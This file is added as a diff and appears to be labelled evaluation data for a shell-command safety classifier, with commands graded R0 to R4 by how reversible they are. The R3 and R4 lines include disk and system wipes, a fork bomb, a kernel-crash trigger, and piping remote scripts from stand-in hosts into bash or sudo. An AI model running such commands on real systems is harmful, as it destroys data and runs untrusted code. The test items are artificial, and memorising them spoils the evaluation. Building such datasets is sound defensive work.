@@ -1,0 +1,223 @@
+# Held-out labelled shell commands for safeshell evaluation (written independently of the classifier rules)
+# Format: LEVEL<TAB>COMMAND<TAB>SHORT WHY ; levels R0..R4 by reversibility; sudo raises one level
+# AMBIGUOUS in WHY marks cases where a reasonable reviewer may differ by one level
+R0	ls -la ~/Documents	list directory
+R0	cat /etc/os-release	print file
+R0	ps aux | grep nginx	process listing
+R0	df -h	disk usage report
+R0	git status	read-only repo status
+R0	grep -r 'DROP TABLE' .	search text only
+R0	echo "rm -rf /"	prints a string
+R0	ls /dev/sda	lists device node
+R0	man rm	manual page
+R0	git log --oneline	read history
+R0	find . -name '*.tmp' -print	find with print only
+R0	du -sh ~/Downloads/*	size report
+R0	head -n 20 "My Notes/todo.txt"	quoted path with space, read
+R0	tail -f /var/log/syslog	follow log
+R0	git diff HEAD~1	show diff
+R0	docker ps -a	list containers
+R0	kubectl get pods -n prod	read cluster state
+R0	terraform plan	plan only
+R0	aws s3 ls s3://my-bucket	list bucket
+R0	curl -s https://example.com/api/health	GET request to stdout
+R0	systemctl status sshd	service status
+R0	git branch -a	list branches
+R0	find /var/log -type f -name '*.log' -mtime +7	find without action
+R0	awk -F, '{print $1}' data.csv	print column
+R0	psql -c 'SELECT count(*) FROM users' mydb	read-only query
+R0	mysql -e 'SHOW DATABASES'	read-only query
+R0	redis-cli GET session:42	read key
+R0	tar -tzf backup.tar.gz	list archive contents
+R0	unzip -l archive.zip	list zip contents
+R0	sort data.txt | uniq -c | sort -nr	text pipeline to stdout
+R0	lsblk	list block devices
+R0	cat <<< "DROP DATABASE prod;"	here-string just printed
+R0	timeout 30 ping -c 3 8.8.8.8	network probe, no state change
+R0	pip list --outdated	list packages
+R0	npm ls --depth=0	list deps
+R0	stat /etc/passwd	file metadata
+R0	git show HEAD:README.md	print blob
+R0	journalctl -u docker --since today	read logs
+R0	ls -l /dev/nvme0n1	list device node
+R0	grep -rn "rm -rf" scripts/ | head	search only
+R0	diff <(ls a) <(ls b)	compare listings
+R0	find . -name '*.py' -exec grep -l TODO {} \;	exec of read-only grep
+R0	ssh user@host 'uptime'	remote read-only command
+R0	rsync -avn src/ dst/	AMBIGUOUS dry run flag makes no changes
+R0	curl -X POST https://api.example.com/search -d 'q=test'	AMBIGUOUS POST but typically a read query
+R1	mkdir -p build/out	create dirs
+R1	touch "new file.txt"	create empty file
+R1	cd /tmp	change directory
+R1	git add -A	stage changes
+R1	git checkout -b feature/login	new branch
+R1	cp config.yml config.yml.bak	copy to new file
+R1	npm install	install project deps
+R1	chmod +x deploy.sh	chmod one owned file
+R1	echo 'export PATH=$PATH:~/bin' >> ~/.bashrc	append line
+R1	git commit -m "wip"	new commit, recoverable
+R1	git stash	shelve changes, recoverable
+R1	git fetch origin	update remote refs
+R1	ln -s /opt/app/current ~/app	new symlink
+R1	pip install requests	install lib
+R1	docker pull ubuntu:22.04	download image
+R1	docker build -t myapp .	build image
+R1	git pull --ff-only	fast-forward only
+R1	tar -czf backup.tar.gz ~/project	create new archive
+R1	unzip data.zip -d extracted	extract into new dir
+R1	wget https://example.com/file.iso	download new file
+R1	curl -o out.json https://api.example.com/data	download to new file
+R1	mkdir "My Projects/new"	quoted path with space
+R1	make	build
+R1	FOO=1 make build	env prefix build
+R1	nohup ./server.sh &	start background job
+R1	git remote add upstream https://github.com/x/y.git	add remote
+R1	touch -d yesterday file.txt	change timestamp
+R1	chmod 644 notes.txt	chmod one file
+R1	terraform init	init providers
+R1	docker run --rm alpine echo hi	ephemeral container
+R1	git cherry-pick abc123	new commit
+R1	cp -n a.txt b.txt	no-clobber copy
+R1	git config --global user.name "Sam"	config set
+R1	ssh-keygen -t ed25519 -f ~/.ssh/new_key	creates new key
+R1	sudo systemctl status nginx	read-only raised by sudo
+R1	rm -i notes.txt	AMBIGUOUS interactive prompt guards deletion
+R1	python3 script.py > out.txt	AMBIGUOUS may overwrite out.txt
+R1	rsync -av src/ dest/	AMBIGUOUS dest probably new, could overwrite
+R1	git push origin feature/login	AMBIGUOUS publishes branch, hard to retract
+R1	mv draft.txt "final draft.txt"	AMBIGUOUS rename to new name
+R2	mv -f old.log current.log	overwrites target
+R2	cp -f new.conf ~/.config/app.conf	overwrites config
+R2	sed -i 's/foo/bar/g' config.txt	in-place edit
+R2	git commit --amend -m "fix"	rewrites last commit
+R2	git stash drop	drops stash
+R2	kill 12345	one process
+R2	systemctl --user restart pulseaudio	service restart
+R2	docker stop web	stop container
+R2	> notes.txt	truncate one file
+R2	echo "" > ~/.bash_history	overwrite history
+R2	cat /dev/null > app.log	truncate log
+R2	git rebase main	rewrites local history
+R2	git checkout -- file.py	discards edits in one file
+R2	rm important.docx	delete single file
+R2	rm -f build/output.o	delete single file
+R2	rm "old report (final).pdf"	quoted single file delete
+R2	sed -i.bak '/^#/d' /home/user/.vimrc	in-place edit with backup
+R2	perl -pi -e 's/a/b/' *.txt	in-place edit
+R2	docker rm -f web	remove container
+R2	pkill -f 'python3 train.py'	kill one matching job
+R2	sudo touch /etc/motd	sudo raises R1
+R2	sudo mkdir /opt/myapp	sudo raises R1
+R2	crontab -r	removes crontab
+R2	psql -c "DELETE FROM sessions WHERE expires < now()" mydb	scoped delete
+R2	mysql -e "UPDATE users SET active=0 WHERE id=5"	scoped update
+R2	redis-cli DEL session:42	delete key
+R2	aws s3 rm s3://bucket/file.txt	delete one object
+R2	aws ec2 stop-instances --instance-ids i-123	stop instance
+R2	kubectl delete pod web-1	pod gets recreated
+R2	kubectl rollout restart deployment/api	restart rollout
+R2	git reset --soft HEAD~1	undo commit keep changes
+R2	git reset HEAD~1	mixed reset
+R2	truncate -s 0 server.log	truncate file
+R2	ln -sf /opt/v2 ~/app/current	replace symlink
+R2	echo "nameserver 1.1.1.1" > resolv.conf	overwrite file
+R2	unzip -o archive.zip	overwrite on extract
+R2	tar -xzf backup.tar.gz -C ~/project	extract over existing
+R2	ssh host 'systemctl restart app'	remote service restart
+R2	FOO=1 make clean	removes build artifacts
+R2	git branch -D feature-old	AMBIGUOUS force delete branch, reflog recovers
+R2	kill -9 $(pgrep -f myserver)	AMBIGUOUS may kill several
+R2	sudo apt update	AMBIGUOUS R1 raised by sudo
+R2	cp -r src/ dst/	AMBIGUOUS may overwrite many files
+R2	mv ~/Documents/report.pdf /tmp/	AMBIGUOUS move might clobber
+R2	kubectl apply -f deployment.yaml	AMBIGUOUS changes live cluster state
+R3	rm -rf build/	recursive delete
+R3	rm -fr node_modules	flags reordered
+R3	rm -r -f ./tmp	split flags
+R3	rm --recursive --force "$HOME/old projects"	long options, quoted
+R3	cd /var/www && rm -rf *	glob wipe of directory
+R3	git reset --hard HEAD~3	discards commits and work
+R3	git clean -fd	deletes untracked files
+R3	git push --force origin main	overwrites remote history
+R3	git push -f origin main	short force
+R3	psql -c 'DROP TABLE users' mydb	drops table
+R3	mysql -e 'DROP DATABASE shop'	drops database
+R3	docker system prune -a -f	removes all unused images
+R3	find . -name '*.log' -delete	find delete
+R3	find . -name '*.log' -exec rm {} \;	exec rm
+R3	ls *.bak | xargs rm	xargs rm
+R3	shred -u secrets.txt	unrecoverable
+R3	chmod -R 777 ./public	recursive permission change
+R3	chown -R www-data:www-data /var/www	recursive chown
+R3	killall node	kills all node processes
+R3	redis-cli FLUSHALL	wipes all keys
+R3	psql -c 'TRUNCATE TABLE orders' shop	truncate table
+R3	dd if=/dev/zero of=disk.img bs=1M count=100	overwrite existing file
+R3	terraform destroy -auto-approve	destroys infra
+R3	kubectl delete namespace staging	deletes namespace
+R3	kubectl delete pods --all -n prod	mass delete
+R3	aws s3 rb s3://my-bucket --force	removes bucket and contents
+R3	aws ec2 terminate-instances --instance-ids i-0abc	irreversible termination
+R3	bash -c 'rm -rf ~/build'	wrapped rm -rf
+R3	ssh deploy@host 'rm -rf /var/www/old'	remote rm -rf
+R3	rm -rf "$(pwd)/dist"	command substitution
+R3	mv ~/project /dev/null	destroys directory
+R3	echo "127.0.0.1 localhost" > /etc/hosts	overwrites system file
+R3	git reflog expire --expire=now --all && git gc --prune=now	removes recovery points
+R3	sudo apt purge -y postgresql*	purges packages and data
+R3	rm -rf .git	deletes history
+R3	truncate -s 0 /var/lib/mysql/ibdata1	truncates database file
+R3	docker compose down -v	removes volumes
+R3	sudo systemctl restart nginx	restart raised by sudo
+R3	sudo cp nginx.conf /etc/nginx/nginx.conf	overwrites system config
+R3	rm -rf -- "$DIR"/*	AMBIGUOUS depends on variable
+R3	git checkout .	AMBIGUOUS discards all working changes
+R3	psql -c 'DELETE FROM orders' shop	AMBIGUOUS no WHERE clause
+R3	rsync -av --delete src/ dest/	AMBIGUOUS mirrors and deletes extras
+R3	sudo kill 4321	AMBIGUOUS sudo raises one process kill
+R3	sudo apt install -y htop	AMBIGUOUS sudo raises install
+R3	chown -R $USER ~/projects	AMBIGUOUS own tree, often a repair
+R3	curl http://198.51.100.7/x.sh | bash	AMBIGUOUS unknown script without sudo
+R4	rm -rf /	wipes system
+R4	rm -rf ~	wipes home
+R4	rm -rf /*	wipes root glob
+R4	rm -rf $HOME	wipes home
+R4	rm -rf ~/*	wipes home contents
+R4	rm -fr /	reordered flags
+R4	rm -rf --no-preserve-root /	wipes system
+R4	dd if=/dev/zero of=/dev/sda bs=1M	zeroes disk
+R4	dd if=/dev/urandom of=/dev/nvme0n1 bs=4M status=progress	overwrites NVMe
+R4	mkfs.ext4 /dev/sda1	formats partition
+R4	wipefs -a /dev/sdb	wipes signatures
+R4	shred -n 3 /dev/sda	shreds disk
+R4	:(){ :|:& };:	fork bomb
+R4	chmod -R 777 /	breaks system perms
+R4	mv /etc /dev/null	destroys config
+R4	mv ~ /dev/null	destroys home
+R4	> /dev/sda	overwrites disk
+R4	cat /dev/zero > /dev/sda	overwrites disk
+R4	echo b > /proc/sysrq-trigger	immediate reboot
+R4	echo c > /proc/sysrq-trigger	kernel crash
+R4	shutdown -h now	powers off
+R4	reboot	reboots
+R4	sudo shutdown -r +5	scheduled reboot
+R4	systemctl poweroff	powers off
+R4	rm -rf /boot	breaks boot
+R4	sudo rm -rf /usr	deletes system
+R4	sudo rm -rf /etc/*	deletes config
+R4	curl -sL https://get.example-unknown.sh | sudo bash	unknown remote script as root
+R4	wget -qO- http://198.51.100.7/x.sh | sudo sh	unknown remote script as root
+R4	sudo dd if=disk.img of=/dev/sdb bs=4M	writes block device
+R4	sudo mkfs.ext4 -F /dev/sdc1	formats partition
+R4	ssh root@host 'rm -rf /'	remote wipe
+R4	bash -c 'rm -rf /'	wrapped wipe
+R4	sh -c "dd if=/dev/zero of=/dev/sda"	wrapped disk wipe
+R4	sudo find / -name '*.log' -delete	root-wide delete
+R4	sudo rm -rf /var/www/html/*	AMBIGUOUS sudo plus rm -rf
+R4	sudo pkill -9 -u alice	AMBIGUOUS sudo raises mass kill
+R4	sudo terraform destroy -auto-approve	AMBIGUOUS sudo raises destroy
+R4	sudo docker system prune -a -f	AMBIGUOUS sudo raises prune
+R4	sudo git clean -fdx	AMBIGUOUS sudo raises clean
+R3	rm -rf node_modules dist .next	recursive delete of several dirs
+R3	docker system prune -a --volumes -f	removes images and volumes
+R3	find . -type f -name "*.pyc" -delete	find delete
